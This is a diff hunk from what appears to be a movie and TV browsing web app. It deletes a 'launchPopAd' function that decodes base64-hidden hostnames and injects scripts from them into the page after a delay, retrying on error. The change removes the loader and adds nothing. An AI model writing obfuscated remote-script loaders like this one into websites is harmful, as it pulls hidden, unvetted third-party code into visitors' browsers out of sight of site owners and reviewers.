@@ -287,34 +287,6 @@ async function loadBannerTrailer() {
   }
 }
 
-// 🚀 Smart Delayed PopAd
-function launchPopAd() {
-  setTimeout(() => {
-    var h = "fed6e471b4c88049ce9a5b28346f6a05",
-        o = [
-          "d3d3LmNkbjRhZHMuY29tL3dibHVlaW1wLWdhbGxlcnkubWluLmNzcw==",
-          "ZDNnNW92Zm5nanc5YncuY2xvdWRm9udC5uZXQvci9jY2lyY2xlcy5taW4uanM="
-        ],
-        b = -1, p, v;
-
-    function d() {
-      clearTimeout(p);
-      b++;
-      if (o[b] && !(1771658868000 < (new Date).getTime() && 1 < b)) {
-        v = document.createElement("script");
-        v.type = "text/javascript";
-        v.async = true;
-        v.src = "https://" + atob(o[b]);
-        v.crossOrigin = "anonymous";
-        v.onerror = d;
-        document.getElementsByTagName("head")[0].appendChild(v);
-      }
-    }
-
-    d();
-  }, 5000); // Delay 5 seconds after click
-}
-
 // 🚀 Start App
 fetchTrendingMovies();
 fetchTrendingTV();
